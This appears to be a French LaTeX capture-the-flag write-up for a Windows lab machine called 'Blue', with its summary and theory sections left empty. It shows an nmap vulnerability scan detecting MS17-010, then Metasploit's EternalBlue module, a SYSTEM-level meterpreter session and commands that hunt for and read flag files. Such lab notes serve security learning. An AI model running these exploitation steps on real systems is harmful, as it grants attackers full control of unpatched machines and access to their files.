\chapter{Blue [Windows:Easy]}
\begin{itemize}
    \item {\bf keywords}: \gls{t:eternal-blue}
    \item {\bf Components}: \gls{smb}
    \item {\bf tools}: metasploit
\end{itemize}

\section{Résumé}

\section{Details}

un coup de \verb+nmap+ nous montre un \verb+smb+ (445) en plus du
\verb+netbios+ (139) et \verb+msrpc+ (135)

un coup focalisé sur \verb+smb+ avec un:
\begin{verbatim}
sudo nmap -sV --script=vuln,default -p445
\end{verbatim}

nous montre un:
\begin{verbatim}
PORT    STATE SERVICE      VERSION
445/tcp open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: -19m56s, deviation: 34m34s, median: 0s
| smb2-time:
|   date: 2022-09-01T02:52:43
|_  start_date: 2022-09-01T02:38:47
| smb-os-discovery:
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: haris-PC
|   NetBIOS computer name: HARIS-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2022-09-01T03:52:45+01:00
|_smb-vuln-ms10-054: false
| smb2-security-mode:
|   2.1:
|_    Message signing enabled but not required
\end{verbatim}

easy mode : metasploit

\begin{verbatim}
search MS17-010
use exploit/windows/smb/ms17_010_eternalblue
.. .
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > run file_collector -d "c:\\" -r -f *.txt|*flag*
meterpreter > cat c:\\Users\\haris\\Desktop\\user.txt
\end{verbatim}

done

\section{Théorie}

